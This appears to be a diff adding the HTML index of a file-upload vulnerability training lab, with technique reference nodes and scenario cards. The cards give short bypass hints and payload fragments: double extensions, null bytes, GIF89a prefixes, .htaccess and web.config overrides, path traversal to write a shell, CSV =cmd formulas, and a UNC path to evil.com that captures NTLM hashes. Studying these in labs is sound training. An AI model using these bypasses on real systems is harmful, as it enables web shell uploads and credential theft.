+          <div class="tree-node-title"><span class="ref-dot"></span>Slash Suffixes &amp; Windows Dots</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Slash Suffixes &amp; Windows Dots</div>
+            <div class="popup-code"><code>test.php/ / test.php.\ / file.php......</code></div>
+            <div class="popup-desc">Trailing slashes or dots stripped during filesystem path resolution.</div>
+          </div>
+        </div>
+        <div class="tree-node is-ref" data-branch="filter" data-search="overlong truncation empty extension max length">
+          <div class="tree-node-title"><span class="ref-dot"></span>Overlong Truncation &amp; Empty Ext</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Overlong Truncation &amp; Empty Ext</div>
+            <div class="popup-code"><code>255-char max length cut / test. / .php</code></div>
+            <div class="popup-desc">Filesystem filename limit truncation revealing underlying extensions.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Delimiters & Magic Bytes</div>
+      <div class="tree-nodes">
+        <a href="/scenario09/" class="tree-node is-lab" data-branch="filter" data-lab="09" data-search="null byte truncation 00 zero byte scenario 09">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Null Byte Injection</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 09</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-medium">medium</span>
+            </div>
+            <div class="popup-title">Null Byte Injection</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Null Byte</strong></span>
+            </div>
+            <div class="popup-code"><code>test.png%00.php / \x00 zero byte</code></div>
+            <div class="popup-desc">Validation sees .jpg, filesystem truncates at %00 and saves as .php. Use Burp Repeater.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario20/" class="tree-node is-lab" data-branch="filter" data-lab="20" data-search="magic byte spoofing gif89a mime magic scenario 20">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Magic Byte Bypass</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 20</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Magic Byte Bypass</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Magic Bytes</strong></span>
+            </div>
+            <div class="popup-code"><code>GIF89a image signature prefix</code></div>
+            <div class="popup-desc">Server checks file header. Prepend GIF89a to PHP shell and upload via Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario30/" class="tree-node is-lab" data-branch="filter" data-lab="30" data-search="trailing dot space slash windows bypass php dot space scenario 30">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Trailing Dot/Space Bypass</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 30</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Trailing Dot/Space Bypass</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Filter Bypass</strong></span>
+            </div>
+            <div class="popup-code"><code>shell.php. / shell.php&lt;space&gt;</code></div>
+            <div class="popup-desc">Windows strips trailing dot/space. Bypass .php filter with shell.php. using Burp Repeater.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="filter" data-search="whitespace delimiters spaces newline">
+          <div class="tree-node-title"><span class="ref-dot"></span>Whitespace Delimiters</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Whitespace Delimiters</div>
+            <div class="popup-code"><code>test.php\x20 / test.png\x0d\x0a.php</code></div>
+            <div class="popup-desc">Trailing whitespace or newline characters bypassing regex boundaries.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="tree-branch branch-xss" data-branch="xss">
+  <div class="tree-branch-header header-green">
+    <span class="branch-pill-badge">XSS</span>
+  </div>
+  <div class="tree-groups">
+    <div class="tree-group">
+      <div class="tree-group-title">Common Vectors & Filename</div>
+      <div class="tree-nodes">
+        <a href="/scenario10/" class="tree-node is-lab" data-branch="xss" data-lab="10" data-search="reflected filename xss script alert scenario 10">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Stored XSS via Filename</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 10</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-medium">medium</span>
+            </div>
+            <div class="popup-title">Stored XSS via Filename</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Filename XSS</strong></span>
+            </div>
+            <div class="popup-code"><code>&lt;script&gt;alert(1)&lt;/script&gt; in filename</code></div>
+            <div class="popup-desc">Filename reflected without escaping. Inject XSS via filename using Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario31/" class="tree-node is-lab" data-branch="xss" data-lab="31" data-search="iis semicolon bypass asp aspx jpg asp;.jpg scenario 31">
+          <div class="tree-node-title"><span class="pulse-dot"></span>IIS Semicolon Bypass</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 31</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">IIS Semicolon Bypass</div>
+            <div class="popup-meta">
+              <span>Category: <strong>IIS Bypass</strong></span>
+            </div>
+            <div class="popup-code"><code>shell.asp;.jpg</code></div>
+            <div class="popup-desc">IIS 6.0 executes shell.asp;.jpg as ASP. Upload with semicolon using Burp (quoted filename).</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="xss" data-search="svg stored xss vector javascript">
+          <div class="tree-node-title"><span class="ref-dot"></span>SVG Stored Script Execution</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">SVG Stored Script Execution</div>
+            <div class="popup-code"><code>Vector XML script injection (See Lab 12 under Images)</code></div>
+            <div class="popup-desc">Direct JavaScript execution inside victim browser from stored SVG uploads.</div>
+          </div>
+        </div>
+        <div class="tree-node is-ref" data-branch="xss" data-search="html formats xml formats svgz xhtml">
+          <div class="tree-node-title"><span class="ref-dot"></span>Common HTML &amp; XML Formats</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Common HTML &amp; XML Formats</div>
+            <div class="popup-code"><code>.htm, .html, .shtml / .xml, .xsl, .svgz, .xhtml, .xsd</code></div>
+            <div class="popup-desc">Web document formats interpreted as HTML/XML leading to script execution.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Server Specific Content</div>
+      <div class="tree-nodes">
+        <div class="tree-node is-ref" data-branch="xss" data-search="iis web server mime types hxt dtd xslt">
+          <div class="tree-node-title"><span class="ref-dot"></span>IIS Web Server Types</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">IIS Web Server Types</div>
+            <div class="popup-code"><code>HTML: .htm, .hxt | XML: .dtd, .xslt, .vml, .disco, .wsdl</code></div>
+            <div class="popup-desc">IIS script and configuration mappings executable via browser.</div>
+          </div>
+        </div>
+        <div class="tree-node is-ref" data-branch="xss" data-search="apache content negotiation mod_negotiation html de">
+          <div class="tree-node-title"><span class="ref-dot"></span>Apache Content Negotiation</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Apache Content Negotiation</div>
+            <div class="popup-code"><code>.html.de, .html.XXX / .rdf, .mathml</code></div>
+            <div class="popup-desc">Apache mod_negotiation language-variant extensions served as HTML.</div>
+          </div>
+        </div>
+        <div class="tree-node is-ref" data-branch="xss" data-search="web manifest appcache vtt mml">
+          <div class="tree-node-title"><span class="ref-dot"></span>Other / Rare Formats</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">Other / Rare Formats</div>
+            <div class="popup-code"><code>HTML: body, manifest, appcache | XML: .vtt, .mml</code></div>
+            <div class="popup-desc">HTML5 manifests and subtitle formats parsed by browsers.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="tree-branch branch-other" data-branch="other">
+  <div class="tree-branch-header header-cyan">
+    <span class="branch-pill-badge">Other</span>
+  </div>
+  <div class="tree-groups">
+    <div class="tree-group">
+      <div class="tree-group-title">Server Configurations</div>
+      <div class="tree-nodes">
+        <a href="/scenario18/" class="tree-node is-lab" data-branch="other" data-lab="18" data-search="server config upload htaccess apache sethandler scenario 18">
+          <div class="tree-node-title"><span class="pulse-dot"></span>.htaccess Override</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 18</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">.htaccess Override</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Config (.htaccess)</strong></span>
+            </div>
+            <div class="popup-code"><code>Apache AddType / SetHandler mapping</code></div>
+            <div class="popup-desc">Upload .htaccess to map .jpg to PHP, then upload shell.jpg. Two-step bypass with Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario27/" class="tree-node is-lab" data-branch="other" data-lab="27" data-search="uwsgi configuration upload exec scheme scenario 27">
+          <div class="tree-node-title"><span class="pulse-dot"></span>uWSGI Config RCE</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 27</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-critical">critical</span>
+            </div>
+            <div class="popup-title">uWSGI Config RCE</div>
+            <div class="popup-meta">
+              <span>Category: <strong>uWSGI Config</strong></span>
+            </div>
+            <div class="popup-code"><code>uWSGI configuration exec scheme</code></div>
+            <div class="popup-desc">uWSGI exec:// scheme in ini leads to RCE. Upload malicious uwsgi.ini via Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario28/" class="tree-node is-lab" data-branch="other" data-lab="28" data-search="iis web.config override handler mapping jpg php asp net scenario 28">
+          <div class="tree-node-title"><span class="pulse-dot"></span>IIS web.config Override</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 28</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">IIS web.config Override</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Server Config</strong></span>
+            </div>
+            <div class="popup-code"><code>web.config &lt;handlers&gt; *.jpg → PHP</code></div>
+            <div class="popup-desc">IIS web.config maps .jpg to PHP. Upload web.config then shell.jpg via Burp - two-step.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario29/" class="tree-node is-lab" data-branch="other" data-lab="29" data-search="user.ini auto_prepend_file php fpm nginx prepend jpg scenario 29">
+          <div class="tree-node-title"><span class="pulse-dot"></span>.user.ini Auto-Prepend</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 29</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">.user.ini Auto-Prepend</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Server Config</strong></span>
+            </div>
+            <div class="popup-code"><code>auto_prepend_file = proof.jpg</code></div>
+            <div class="popup-desc">PHP .user.ini sets auto_prepend_file to JPG. Upload .user.ini then shell.jpg via Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="other" data-search="iis web config override asp net handler">
+          <div class="tree-node-title"><span class="ref-dot"></span>IIS web.config Override</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">IIS web.config Override</div>
+            <div class="popup-code"><code>ASP.NET handler mapping override</code></div>
+            <div class="popup-desc">Uploading web.config to register custom handlers or disable request filtering.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Archive / ZIP Extraction</div>
+      <div class="tree-nodes">
+        <a href="/scenario24/" class="tree-node is-lab" data-branch="other" data-lab="24" data-search="zip slip extraction archive traversal directory traversal scenario 24">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Zip Slip</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 24</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-critical">critical</span>
+            </div>
+            <div class="popup-title">Zip Slip</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Zip Slip</strong></span>
+            </div>
+            <div class="popup-code"><code>Directory traversal inside archive entry</code></div>
+            <div class="popup-desc">ZIP entry with ../../ escapes extraction dir. Create malicious ZIP with Python and upload via Burp.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario25/" class="tree-node is-lab" data-branch="other" data-lab="25" data-search="archive symlink file read symbolic link scenario 25">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Archive Symlink Read</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 25</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Archive Symlink Read</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Archive Symlink</strong></span>
+            </div>
+            <div class="popup-code"><code>Preserved symbolic link targeting /etc/passwd</code></div>
+            <div class="popup-desc">Archive with symlink to /etc/passwd. Create tar with symlink via Python and upload.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Document Parsers & Remote URL</div>
+      <div class="tree-nodes">
+        <a href="/scenario16/" class="tree-node is-lab" data-branch="other" data-lab="16" data-search="document parser xxe docx xlsx ooxml scenario 16">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Document XXE (OOXML)</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 16</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Document XXE (OOXML)</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Document XXE</strong></span>
+            </div>
+            <div class="popup-code"><code>OOXML / ODF (.docx / .xlsx) entity read</code></div>
+            <div class="popup-desc">Office docs are ZIP with XML. Inject XXE entity to read local files.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario15/" class="tree-node is-lab" data-branch="other" data-lab="15" data-search="remote url upload ssrf intranet loopback scenario 15">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Remote URL SSRF</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 15</span>
+              <span class="popup-diff diff-medium">medium</span>
+              <span class="popup-sev sev-high">high</span>
+            </div>
+            <div class="popup-title">Remote URL SSRF</div>
+            <div class="popup-meta">
+              <span>Category: <strong>URL SSRF</strong></span>
+            </div>
+            <div class="popup-code"><code>Fetch user URL (Loopback / Intranet probe)</code></div>
+            <div class="popup-desc">Server fetches user-supplied URL without restriction. Use Burp to SSRF internal services.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+      </div>
+    </div>
+    <div class="tree-group">
+      <div class="tree-group-title">Attacks via Filename & Storage</div>
+      <div class="tree-nodes">
+        <a href="/scenario22/" class="tree-node is-lab" data-branch="other" data-lab="22" data-search="path traversal out of uploads directory escape dot dot slash scenario 22">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Path Traversal via Filename</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 22</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-critical">critical</span>
+            </div>
+            <div class="popup-title">Path Traversal via Filename</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Path Traversal</strong></span>
+            </div>
+            <div class="popup-code"><code>Relative path: ../../../tmp/shell.php</code></div>
+            <div class="popup-desc">Filename with ../ escapes uploads/. Use Burp Repeater to traverse and write shell.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario06/" class="tree-node is-lab" data-branch="other" data-lab="06" data-search="overwrite existing file upload collision scenario 06">
+          <div class="tree-node-title"><span class="pulse-dot"></span>File Overwrite</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 06</span>
+              <span class="popup-diff diff-easy">easy</span>
+              <span class="popup-sev sev-medium">medium</span>
+            </div>
+            <div class="popup-title">File Overwrite</div>
+            <div class="popup-meta">
+              <span>Category: <strong>File Overwrite</strong></span>
+            </div>
+            <div class="popup-code"><code>Asset collision without sanitization</code></div>
+            <div class="popup-desc">Uploads overwrite existing files. Replace avatar.jpg with your file.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario07/" class="tree-node is-lab" data-branch="other" data-lab="07" data-search="csv formula injection dde macro scenario 07">
+          <div class="tree-node-title"><span class="pulse-dot"></span>CSV Formula Injection</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 07</span>
+              <span class="popup-diff diff-easy">easy</span>
+              <span class="popup-sev sev-medium">medium</span>
+            </div>
+            <div class="popup-title">CSV Formula Injection</div>
+            <div class="popup-meta">
+              <span>Category: <strong>CSV Injection</strong></span>
+            </div>
+            <div class="popup-code"><code>=cmd|&#x27; /C ...&#x27;!A0 spreadsheet formula</code></div>
+            <div class="popup-desc">CSV cells with =cmd|... execute when opened in Excel. Upload malicious CSV.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <a href="/scenario23/" class="tree-node is-lab" data-branch="other" data-lab="23" data-search="web shell upload race condition toctou scan window scenario 23">
+          <div class="tree-node-title"><span class="pulse-dot"></span>Race Condition (TOCTOU)</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-lab">Lab 23</span>
+              <span class="popup-diff diff-hard">hard</span>
+              <span class="popup-sev sev-critical">critical</span>
+            </div>
+            <div class="popup-title">Race Condition (TOCTOU)</div>
+            <div class="popup-meta">
+              <span>Category: <strong>Race Condition</strong></span>
+            </div>
+            <div class="popup-code"><code>Time of Check / Time of Use scan window</code></div>
+            <div class="popup-desc">File exists briefly before AV deletes it. Use Burp Intruder to race and execute.</div>
+            <div class="popup-action">&rarr; Click to launch scenario</div>
+          </div>
+        </a>
+        <div class="tree-node is-ref" data-branch="other" data-search="unc path injection ntlm hash capture">
+          <div class="tree-node-title"><span class="ref-dot"></span>UNC Path Hash Stealing</div>
+          <div class="tree-node-popup">
+            <div class="popup-header">
+              <span class="popup-ref-tag">THEORY REFERENCE</span>
+            </div>
+            <div class="popup-title">UNC Path Hash Stealing</div>
+            <div class="popup-code"><code>\\evil.com\share\test.png (NTLM capture)</code></div>
+            <div class="popup-desc">Windows UNC paths in filename trigger outbound SMB connection to capture NTLMv2 hashes.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ═══════ Cards Grid Section ═══════ -->
+                <div id="cards-view-wrap">
+                    <!-- Toolbar: search + category filters -->
+                    <div class="toolbar">
+                        <label class="search-box">
+                            <svg viewBox="0 0 24 24" fill-rule="evenodd" aria-hidden="true">
+                                <path d="M10.5 1.5a9 9 0 1 0 5.4 16.22l4.18 4.18a1.125 1.125 0 0 0 1.59-1.59l-4.18-4.18A9 9 0 0 0 10.5 1.5Zm0 2.25a6.75 6.75 0 1 1 0 13.5 6.75 6.75 0 0 1 0-13.5Z" />
+                            </svg>
+                            <input id="lab-search" type="search" placeholder="Search scenarios…" autocomplete="off" />
+                        </label>
+                        <div class="filter-wrap">
+                            <button class="filter-toggle" id="filter-toggle" type="button" aria-expanded="false" aria-haspopup="true">
+                                Filter
+                                <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m6 9 6 6 6-6"/></svg>
+                            </button>
+                            <div class="filter-menu" id="filter-menu" hidden>
+                                <div class="filter-group">
+                                    <span class="filter-group-label">difficulty</span>
+                                    <div class="filter-options">
+                                        <button type="button" class="filter-opt active" data-diff="all">All</button>
+                                        <button type="button" class="filter-opt" data-diff="easy">Easy</button>
+                                        <button type="button" class="filter-opt" data-diff="medium">Medium</button>
+                                        <button type="button" class="filter-opt" data-diff="hard">Hard</button>
+                                    </div>
+                                </div>
+                                <div class="filter-group">
+                                    <span class="filter-group-label">severity</span>
+                                    <div class="filter-options">
+                                        <button type="button" class="filter-opt active" data-sev="all">All</button>
+                                        <button type="button" class="filter-opt" data-sev="critical">Critical</button>
+                                        <button type="button" class="filter-opt" data-sev="high">High</button>
+                                        <button type="button" class="filter-opt" data-sev="medium">Medium</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Scenario cards -->
+                    <div class="labs-grid">
+                    <article class="lab-card" data-diff="easy" data-sev="critical" data-search="scenario 01 scenario 1 unrestricted file upload web shell easy critical burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">01</div>
+                        <h3 class="lab-scenario">Scenario 01</h3>
+                        <p class="lab-challenge">Unrestricted File Upload</p>
+                        <p class="lab-description">No validation at all — upload a PHP web shell and execute it. The most basic file upload RCE.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-critical">critical</strong></div>
+                            <div><span>difficulty</span><strong class="diff-easy">easy</strong></div>
+                            <div><span>category</span><strong>Web Shell</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario01/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="easy" data-sev="high" data-search="scenario 02 scenario 2 client-side validation bypass client bypass easy high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">02</div>
+                        <h3 class="lab-scenario">Scenario 02</h3>
+                        <p class="lab-challenge">Client-Side Validation Bypass</p>
+                        <p class="lab-description">Browser JS blocks .php, but server doesn't. Intercept with Burp and change filename.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-easy">easy</strong></div>
+                            <div><span>category</span><strong>Client Bypass</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario02/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="easy" data-sev="high" data-search="scenario 03 scenario 3 content-type bypass mime bypass easy high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">03</div>
+                        <h3 class="lab-scenario">Scenario 03</h3>
+                        <p class="lab-challenge">Content-Type Bypass</p>
+                        <p class="lab-description">Server trusts client-supplied Content-Type. Spoof it to image/png with Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-easy">easy</strong></div>
+                            <div><span>category</span><strong>MIME Bypass</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario03/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="easy" data-sev="high" data-search="scenario 04 scenario 4 extension blacklist bypass alternative shell easy high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">04</div>
+                        <h3 class="lab-scenario">Scenario 04</h3>
+                        <p class="lab-challenge">Extension Blacklist Bypass</p>
+                        <p class="lab-description">Blacklist blocks .php only. Bypass with .php5, .phtml, .phar using Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-easy">easy</strong></div>
+                            <div><span>category</span><strong>Alternative Shell</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario04/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="easy" data-sev="medium" data-search="scenario 05 scenario 5 case sensitivity bypass case bypass easy medium burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">05</div>
+                        <h3 class="lab-scenario">Scenario 05</h3>
+                        <p class="lab-challenge">Case Sensitivity Bypass</p>
+                        <p class="lab-description">Filter checks lowercase .php only. Bypass with .PhP, .PHP using Burp Repeater.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-medium">medium</strong></div>
+                            <div><span>difficulty</span><strong class="diff-easy">easy</strong></div>
+                            <div><span>category</span><strong>Case Bypass</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario05/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="easy" data-sev="medium" data-search="scenario 06 scenario 6 file overwrite file overwrite easy medium burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">06</div>
+                        <h3 class="lab-scenario">Scenario 06</h3>
+                        <p class="lab-challenge">File Overwrite</p>
+                        <p class="lab-description">Uploads overwrite existing files. Replace avatar.jpg with your file.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-medium">medium</strong></div>
+                            <div><span>difficulty</span><strong class="diff-easy">easy</strong></div>
+                            <div><span>category</span><strong>File Overwrite</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario06/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="easy" data-sev="medium" data-search="scenario 07 scenario 7 csv formula injection csv injection easy medium burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">07</div>
+                        <h3 class="lab-scenario">Scenario 07</h3>
+                        <p class="lab-challenge">CSV Formula Injection</p>
+                        <p class="lab-description">CSV cells with =cmd|... execute when opened in Excel. Upload malicious CSV.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-medium">medium</strong></div>
+                            <div><span>difficulty</span><strong class="diff-easy">easy</strong></div>
+                            <div><span>category</span><strong>CSV Injection</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario07/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="high" data-search="scenario 08 scenario 8 double extension bypass double extension medium high burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">08</div>
+                        <h3 class="lab-scenario">Scenario 08</h3>
+                        <p class="lab-challenge">Double Extension Bypass</p>
+                        <p class="lab-description">Server checks final .png, Apache executes inner .php. Upload shell.php.png.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-high">high</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>Double Extension</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario08/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="medium" data-search="scenario 09 scenario 9 null byte injection null byte medium medium burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">09</div>
+                        <h3 class="lab-scenario">Scenario 09</h3>
+                        <p class="lab-challenge">Null Byte Injection</p>
+                        <p class="lab-description">Validation sees .jpg, filesystem truncates at %00 and saves as .php. Use Burp Repeater.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-medium">medium</strong></div>
+                            <div><span>difficulty</span><strong class="diff-medium">medium</strong></div>
+                            <div><span>category</span><strong>Null Byte</strong></div>
+                        </div>
+                        <a class="launch-button" href="/scenario09/">Launch lab &rarr;</a>
+                    </article>
+                    <article class="lab-card" data-diff="medium" data-sev="medium" data-search="scenario 10 scenario 10 stored xss via filename filename xss medium medium burp suite portswigger">
+                        <div class="lab-card-header">
+                            <span class="availability available"><span></span>available</span>
+                        </div>
+                        <div class="lab-icon" aria-hidden="true">10</div>
+                        <h3 class="lab-scenario">Scenario 10</h3>
+                        <p class="lab-challenge">Stored XSS via Filename</p>
+                        <p class="lab-description">Filename reflected without escaping. Inject XSS via filename using Burp.</p>
+                        <div class="lab-meta">
+                            <div><span>severity</span><strong class="severity-medium">medium</strong></div>
